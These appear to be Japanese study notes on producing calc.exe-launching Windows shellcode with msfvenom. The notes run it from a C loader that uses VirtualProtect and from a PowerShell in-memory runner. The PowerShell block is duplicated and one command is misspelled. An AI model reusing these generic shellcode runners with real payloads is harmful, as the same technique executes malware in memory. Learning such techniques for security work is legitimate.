1. windows上で電卓を実行させるためのシェルコードの生成。`-f c`で、Cのヘッダーファイル形式で出力。これによりCのコードないで利用可能。
```
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
```
2. 上記で作成されたシェルコードをcで実行するためのexeファイルの作成
```
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main()
{
  DWORD oldProtect;
  VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
  int (*shellcode)() = (int(*)())(void*)stager;
  shellcode();
}
```

exe形式でコンパイル
```
$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

3. 1でC用に作成したペイロードと同じものをバイナリ形式で作成してみる
```
$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > ./example.bin
```

バイナリ形式で出力されるため、16進数に変換して最初のCのシェルコードと比較をしてみる。同じはず。
```
$ xdd -i ./example.bin
```

4. 上記で生成したバイナリファイルをPowershellで実行
```
$code = [System.IO.File]::ReadAllBytes("example.bin")
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($code.Length)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[Int32]])
$func.Invoke()
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
$code = [System.IO.File]::ReadAllBytes("example.bin")
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($code.Length)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[Int32]])
$func.Invoke()
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
```
